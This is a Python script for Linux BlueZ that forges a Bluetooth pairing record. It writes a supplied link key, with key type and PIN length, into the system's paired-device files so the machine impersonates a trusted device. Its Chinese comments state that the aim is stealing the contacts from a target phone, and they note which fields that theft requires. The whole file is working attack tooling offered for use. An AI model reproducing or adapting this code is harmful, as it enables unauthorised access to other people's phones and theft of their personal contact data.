#!/usr/bin/env python3

import os
import time
import subprocess
import bluetooth._bluetooth as _bt
import struct

from configparser import ConfigParser


def add_paired_dev(local_addr:str, remote_addr:str, remote_name:str, link_key:str):
    '''Paired devices are in /var/lib/bluetooth/<local_addr>/<remote_addr>'''
    paired_dev_root = '/var/lib/bluetooth/' + local_addr + '/' + remote_addr

    try:
        os.mkdir(paired_dev_root)
    except FileExistsError as e:
        print('[Info] File exists: paired_dev_root')

    create_paired_dev_info(local_addr, remote_addr, remote_name, link_key)


def create_paired_dev_attrs(local_addr:str, remote_addr:str):
    '''Create /var/lib/bluetooth/<local_addr>/<remote_addr>/attributes.

    attributes 文件对于窃取目标手机的 contact 不是必须的。
    '''
    path = '/var/lib/bluetooth/' + local_addr + '/' + remote_addr \
         + '/attributes'
    print(path)
    attrs_parser = ConfigParser()
    attrs_parser.optionxform = str # case-sensitive
    filenames = attrs_parser.read(path)

    if path in filenames:
        pass
    else:
        print('[Info] New', path + '.')
        
        try:
            with open(path, 'w') as attrs_file:
                attrs_parser.write(attrs_file, space_around_delimiters=False)
        except OSError as e:
            print(e)


def create_paired_dev_info(
    local_addr:str, 
    remote_addr:str, remote_name:str, link_key:str
):
    '''Create /var/lib/bluetooth/<local_addr>/<remote_addr>/info.
    
    在 info 文件中，窃取目标手机联系人必须填写的数据为 LinkKey section 中的
    Key、Type 和 PINLength。

    General section 中的 Name 不需要填写。与目标手机连接上后，该键值会自动更
    新。
    '''
    path = '/var/lib/bluetooth/' + local_addr + '/' + remote_addr + '/info'

    info_parser = ConfigParser()
    info_parser.optionxform = str # case-sensitive
    filenames = info_parser.read(path)

    if path in filenames:
        try:
            print('[Info] Previous Name:', info_parser.get('General', 'Name'))
            print(
                '[Info] Previous Link Key:', info_parser.get('LinkKey', 'Key')
            )
            print(
                '[Info] Previous Link Key Type:', 
                info_parser.get('LinkKey', 'Type')
            )
            print(
                '[Info] Previous PIN Length:', 
                info_parser.get('LinkKey', 'PINLength')
            )
        except:
            pass

        # info_parser.set('General', 'Name', remote_name)
        # info_parser.set('General', 'Class', '0x5a020c')
        # info_parser.set('General', 'SupportedTechnologies', 'BR/EDR;')
        # info_parser.set('General', 'Trusted',  'ture')
        # info_parser.set('General', 'Blocked', 'false')

        info_parser.set('LinkKey', 'Key', link_key)
        info_parser.set('LinkKey', 'Type', '5')
        info_parser.set('LinkKey', 'PINLength', '0')
    else:
        print('[Info] New', path + '.')

        info_parser['General'] = {
            # 'Name': remote_name,
            # 'Class': '0x5a020c',
            # 'SupportedTechnologies': 'BR/EDR;',
            # 'Trusted': 'ture',
            # 'Blocked': 'false'
        }

        info_parser['LinkKey'] = {
            'Key': link_key,
            'Type': 5,
            'PINLength': 0
        }

        info_parser['DeviceID'] = {
            # 'Source': 1,
            # 'Vendor': 15,
            # 'Product': 4608,
            # 'Version': 5174         
        }

    with open(path, 'w') as info_file:
        info_parser.write(info_file, space_around_delimiters=False)
    try:
        print('[Info] New Name:', info_parser.get('General', 'Name'))
        print(
            '[Info] New Link Key:', info_parser.get('LinkKey', 'Key')
        )
        print(
            '[Info] New Link Key Type:', 
            info_parser.get('LinkKey', 'Type')
        )
        print(
            '[Info] New PIN Length:', 
            info_parser.get('LinkKey', 'PINLength')
        )
    except:
        pass
